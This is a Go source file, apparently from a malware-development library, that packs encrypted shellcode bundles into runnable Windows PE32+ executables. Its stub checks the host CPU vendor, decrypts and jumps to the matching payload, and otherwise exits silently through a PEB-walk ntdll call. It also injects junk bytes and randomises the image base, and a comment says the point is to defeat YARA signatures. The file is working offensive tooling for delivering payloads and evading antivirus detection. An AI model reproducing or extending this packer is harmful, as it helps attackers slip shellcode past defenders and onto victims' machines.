package packer

import (
	"encoding/binary"
	"fmt"
	mathrand "math/rand"
	"sync"

	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
	"github.com/oioio-space/maldev/pe/packer/stubgen/stage1"
	"github.com/oioio-space/maldev/pe/packer/transform"
	"github.com/oioio-space/maldev/random"
)

// exitProcessBlockCache caches the §2 EmitNtdllRtlExitUserProcess(0)
// bytes — the block is deterministic (no varying input) and gets
// embedded into every Windows wrap. /simplify-pass 2026-05-10 flagged
// the per-wrap re-assembly (143-byte primitive emitted via 143
// individual ABYTE progs) as the dominant cost on the wrap hot path.
var (
	exitProcessBlockOnce  sync.Once
	exitProcessBlockBytes []byte
	exitProcessBlockErr   error
)

func cachedExitProcessBlock() ([]byte, error) {
	exitProcessBlockOnce.Do(func() {
		b, err := amd64.New()
		if err != nil {
			exitProcessBlockErr = fmt.Errorf("packer: amd64 builder: %w", err)
			return
		}
		if err := stage1.EmitNtdllRtlExitUserProcess(b, 0); err != nil {
			exitProcessBlockErr = fmt.Errorf("packer: emit ExitProcess: %w", err)
			return
		}
		exitProcessBlockBytes, exitProcessBlockErr = b.Encode()
		if exitProcessBlockErr != nil {
			exitProcessBlockErr = fmt.Errorf("packer: encode ExitProcess: %w", exitProcessBlockErr)
		}
	})
	return exitProcessBlockBytes, exitProcessBlockErr
}

// Windows symmetry of [WrapBundleAsExecutableLinux]. PHASE A shipped
// 2026-05-10.
//
// **Runtime status**: ✅ GREEN on win10 VM —
// TestWrapBundleAsExecutableWindows_E2E_RunsExit42Windows passes
// (matched payload's `mov eax,42; ret` reaches RtlUserThreadStart's
// ExitProcess thunk → process exits 42).
//
// Bug story (preserved for posterity): the first dispatch
// ACCESS_VIOLATIONed (0xc0000005). Routing the stub bytes through
// the asmtrace VEH harness produced a register dump showing
// RIP inside the bundle data, RAX=42 (shellcode HAD run), and
// stack pointer 16 bytes higher than expected. Diagnosis: the
// CPUID prologue's `sub rsp, 16` was never restored before the
// matched payload's `ret` — `ret` popped the host-vendor literal
// bytes ("GenuineIntel") as the return address and JMPed there.
// Fix: insert `add rsp, 16` (4 bytes: 48 83 c4 10) immediately
// before `jmp rdi` in the matched-tail patcher. Linux is
// unaffected because Linux payloads end with `syscall` (exit_group),
// not `ret`.
//
// What this PHASE delivers:
//
//   - Same scan stub as the Linux variant (PIC + CPUID prologue +
//     12-byte vendor compare loop) — copies bytes verbatim from
//     [bundleStubVendorAware] for the prefix and the matched-tail
//     decrypt+JMP sections.
//   - The .no_match block swaps Linux's 9-byte sys_exit_group(0)
//     for a 5-byte `jmp rel32` to the §2 EmitNtdllRtlExitUserProcess
//     primitive (143 B) appended at the stub's end.
//   - Wraps via [transform.BuildMinimalPE32Plus] producing a
//     runnable PE32+.
//
// PHASE B (queued, blocked on PHASE A runtime green):
//
//   - PT_WIN_BUILD predicate wired in (PEB.OSBuildNumber read +
//     range check).
//   - Per-build ImageBase derivation from `profile.Vaddr` (currently
//     ignored on Windows; canonical 0x140000000 used).

// bundleStubVendorAwareWindows returns the Windows-flavoured scan
// stub. Internal layout:
//
//	[0..114]   shared with Linux: PIC + CPUID prologue + loop body
//	[115..119] jmp rel32 → .§2_block at end of stub
//	[120..N]   matched-tail (verbatim from Linux: 19 B body +
//	           53 B decrypt+JMP = 72 B)
//	[N..]      §2 EmitNtdllRtlExitUserProcess(0) — 143 B
//
// The .matched section moved from Linux offset 124 to Windows offset
// 120 (4-byte left shift because the new fallback is 5 B vs 9 B).
// Three Jcc displacements that target .matched have their disp byte
// patched -4 to compensate.
//
// Returns the stub bytes plus an error if the §2 primitive failed
// to assemble (impossible for the fixed exit-code-0 input but
// surfaces cleanly).
func bundleStubVendorAwareWindows() ([]byte, error) {
	linux := bundleStubVendorAware()
	if len(linux) < 124 {
		return nil, fmt.Errorf("packer: linux stub %d bytes < 124 (matched-section anchor)", len(linux))
	}

	// Assemble the §2 ExitProcess block via the cached helper —
	// the bytes are deterministic for exitCode=0, so we pay the
	// 143-prog Builder/Encode cost once per process instead of
	// once per wrap.
	exitBlock, err := cachedExitProcessBlock()
	if err != nil {
		return nil, err
	}

	// Patch the matched-tail to insert `add rsp, 16` (48 83 c4 10)
	// immediately before the trailing `jmp rdi` (ff e7).
	//
	// Why this is needed on Windows but not Linux:
	//
	//   - The CPUID prologue does `sub rsp, 16` to allocate the
	//     12-byte host-vendor scratch buffer. The Linux stub never
	//     restores RSP because Linux payloads end with `syscall`
	//     (exit_group) — they don't `ret`, so the residual stack
	//     allocation is irrelevant.
	//   - Windows shellcode that ends in `ret` (the canonical
	//     pattern, where ntdll!RtlUserThreadStart calls
	//     ExitProcess(rax) on return) pops a return address from
	//     [RSP] expecting the kernel-supplied RtlUserThreadStart
	//     address. Without `add rsp, 16` first, `ret` pops 8 bytes
	//     from the CPUID buffer (the host-vendor literal bytes,
	//     e.g. "GenuineIntel") and JMPs to that garbage address.
	//
	// Caught 2026-05-10 via the asmtrace VEH harness — the
	// register dump showed RIP inside the bundle data at offset
	// matching `bundle+0x75`, RAX=42 (the shellcode HAD run), and
	// the stack pointing 16 bytes higher than expected.
	rawTail := linux[124:]
	if len(rawTail) < 2 || rawTail[len(rawTail)-2] != 0xff || rawTail[len(rawTail)-1] != 0xe7 {
		return nil, fmt.Errorf("packer: linux stub does not end in `jmp rdi` (ff e7); rawTail tail bytes = % x",
			rawTail[len(rawTail)-min(len(rawTail), 4):])
	}
	matchedTail := make([]byte, 0, len(rawTail)+4)
	matchedTail = append(matchedTail, rawTail[:len(rawTail)-2]...)
	matchedTail = append(matchedTail, 0x48, 0x83, 0xc4, 0x10) // add rsp, 16
	matchedTail = append(matchedTail, rawTail[len(rawTail)-2:]...) // jmp rdi
	matchedLen := uint32(len(matchedTail))

	out := make([]byte, 0, 115+5+len(matchedTail)+len(exitBlock))
	out = append(out, linux[:115]...)
	// jmp rel32 → §2 block.
	// End-of-jmp is at offset 120; §2 starts at 120 + matchedLen.
	// Disp = matchedLen.
	out = append(out, 0xe9)
	out = binary.LittleEndian.AppendUint32(out, matchedLen)
	out = append(out, matchedTail...)
	out = append(out, exitBlock...)

	// Patch the three Jcc displacements that target .matched
	// (originally 0x3c / 0x23 / 0x11 in the Linux stub at offsets
	// 63, 88, 106). .matched moved 4 bytes earlier in the Windows
	// stub, so each disp -= 4. Use direct subtraction so a future
	// Linux-stub edit that shifts these constants surfaces here as
	// a compile-time-detectable test failure.
	for _, dispOffset := range []int{63, 88, 106} {
		out[dispOffset] -= 4
	}

	return out, nil
}

// WrapBundleAsExecutableWindows composes a runnable Windows x86-64
// PE32+ from a bundle blob. Mirror of [WrapBundleAsExecutableLinux].
//
// Shipped PHASE A: scan stub matches PT_MATCH_ALL or PT_CPUID_VENDOR;
// PT_WIN_BUILD entries currently fall through (queued for PHASE B).
// On no match, calls ntdll!RtlExitUserProcess(0) via the §2 PEB-walk
// primitive — silent clean exit, equivalent to BundleFallbackExit.
func WrapBundleAsExecutableWindows(bundle []byte) ([]byte, error) {
	return WrapBundleAsExecutableWindowsWith(bundle, BundleProfile{})
}

// WrapBundleAsExecutableWindowsWith is the per-build-profile-aware
// variant. Validates the bundle's magic against profile.Magic
// (canonical default when zero) before wrapping.
//
// Per-build ImageBase derivation from profile.Vaddr is queued for
// PHASE B — today the canonical [transform.MinimalPE32PlusImageBase]
// (0x140000000) is used regardless of profile contents.
func WrapBundleAsExecutableWindowsWith(bundle []byte, profile BundleProfile) ([]byte, error) {
	seed, err := random.Int64()
	if err != nil {
		return nil, fmt.Errorf("packer: stub junk seed: %w", err)
	}
	return WrapBundleAsExecutableWindowsWithSeed(bundle, profile, seed)
}

// WrapBundleAsExecutableWindowsWithSeed is the deterministic variant.
// Same seed → same stub junk pattern → byte-identical wrapped output
// (modulo the random per-payload XOR keys from the upstream bundle
// pack). Use seed=0 for the canonical junk-free shape.
func WrapBundleAsExecutableWindowsWithSeed(bundle []byte, profile BundleProfile, seed int64) ([]byte, error) {
	if len(bundle) < BundleHeaderSize {
		return nil, fmt.Errorf("%w: %d < BundleHeaderSize %d",
			ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	expected := resolvedMagic(profile)
	if magic := binary.LittleEndian.Uint32(bundle[0:4]); magic != expected {
		return nil, fmt.Errorf("%w: %#x != %#x",
			ErrBundleBadMagic, magic, expected)
	}

	stub, err := bundleStubVendorAwareWindows()
	if err != nil {
		return nil, err
	}
	if seed != 0 {
		rng := mathrand.New(mathrand.NewSource(seed))
		stub = injectStubJunk(stub, rng)
	}
	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)

	combined := make([]byte, 0, len(stub)+len(bundle))
	combined = append(combined, stub...)
	combined = append(combined, bundle...)

	imageBase := windowsImageBaseFromProfile(profile)
	return transform.BuildMinimalPE32PlusWithBase(combined, imageBase)
}

// windowsImageBaseFromProfile derives a Windows-suitable ImageBase
// from the bundle profile's Vaddr field (set by [DeriveBundleProfile]
// to randomise per-build IOCs).
//
// PE32+ ImageBase has stricter alignment than ELF PT_LOAD vaddr:
// Windows requires 64K alignment whereas Linux is content with 4K
// page alignment. profile.Vaddr is page-aligned by HKDF + masking
// in DeriveBundleProfile; for Windows we additionally zero the low
// 16 bits.
//
// Returns the canonical ImageBase when:
//   - profile is the zero value (Vaddr == 0; canonical default), or
//   - the masked Vaddr falls below 64K (after low-bits zeroing the
//     value is too low to be a legal user-space ImageBase).
//
// The derivation loses ~4 bits of randomness vs the Linux ELF use
// (12 bits → 16 bits cleared) but the remaining ~36 bits of entropy
// in [0x10000..0x7fff_ffff_ffff_0000] are far more than enough to
// defeat 'tiny PE at canonical 0x140000000' yara rules.
func windowsImageBaseFromProfile(profile BundleProfile) uint64 {
	if profile.Vaddr == 0 {
		return transform.MinimalPE32PlusImageBase
	}
	const peAlignmentMask uint64 = ^uint64(0xffff)
	candidate := profile.Vaddr & peAlignmentMask
	if candidate < 0x10000 {
		return transform.MinimalPE32PlusImageBase
	}
	return candidate
}
